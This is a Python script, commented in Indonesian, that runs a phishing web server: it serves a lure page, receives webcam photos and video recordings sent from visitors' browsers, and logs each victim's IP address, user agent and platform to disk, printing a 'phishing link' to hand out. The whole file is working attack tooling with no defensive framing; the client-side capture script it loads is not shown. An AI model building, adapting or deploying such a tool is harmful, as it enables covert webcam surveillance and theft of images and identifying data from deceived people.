#!/usr/bin/env python3
import http.server
import socketserver
import json
import base64
import os
from datetime import datetime
import threading
import urllib.parse
import socket

PORT = 80
HOST = '0.0.0.0'

# Buat folder logs jika belum ada
if not os.path.exists('logs'):
    os.makedirs('logs')

class CamHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Routing request
        if self.path == '/':
            # Serve halaman phishing
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open('templates/index.html', 'r') as f:
                self.wfile.write(f.read().encode())
        
        elif self.path == '/style.css':
            self.send_response(200)
            self.send_header('Content-type', 'text/css')
            self.end_headers()
            with open('static/style.css', 'r') as f:
                self.wfile.write(f.read().encode())
        
        elif self.path == '/script.js':
            self.send_response(200)
            self.send_header('Content-type', 'application/javascript')
            self.end_headers()
            with open('static/script.js', 'r') as f:
                self.wfile.write(f.read().encode())
        
        else:
            self.send_error(404)
    
    def do_POST(self):
        if self.path == '/save':
            # Terima gambar dari target
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode())
            
            # Decode base64 image
            image_data = base64.b64decode(data['image'].split(',')[1])
            
            # Simpan dengan timestamp dan info target
            filename = f"logs/capture_{data['timestamp']}_{data['userAgent'][:20]}.jpg"
            with open(filename, 'wb') as f:
                f.write(image_data)
            
            # Log informasi target
            log_entry = {
                'timestamp': data['timestamp'],
                'userAgent': data['userAgent'],
                'platform': data['platform'],
                'ip': self.client_address[0],
                'image_file': filename
            }
            
            with open('logs/access.log', 'a') as log_file:
                log_file.write(json.dumps(log_entry) + '\n')
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
        
        elif self.path == '/record':
            # Untuk video recording (opsional)
            content_length = int(self.headers['Content-Length'])
            video_data = self.rfile.read(content_length)
            
            filename = f"logs/video_{datetime.now().strftime('%Y%m%d_%H%M%S')}.webm"
            with open(filename, 'wb') as f:
                f.write(video_data)
            
            self.send_response(200)
            self.end_headers()

    def log_message(self, format, *args):
        # Custom logging
        with open('logs/server.log', 'a') as f:
            f.write(f"{datetime.now()} - {self.client_address[0]} - {args[0]}\n")

def get_local_ip():
    """Dapatkan IP lokal untuk link"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        ip = s.getsockname()[0]
    except:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

def start_server():
    with socketserver.TCPServer((HOST, PORT), CamHandler) as httpd:
        print(f"[+] Server berjalan di http://{get_local_ip()}:{PORT}")
        print(f"[+] Link phishing: http://{get_local_ip()}:{PORT}")
        print("[+] Menunggu target...")
        httpd.serve_forever()

if __name__ == '__main__':
    start_server()
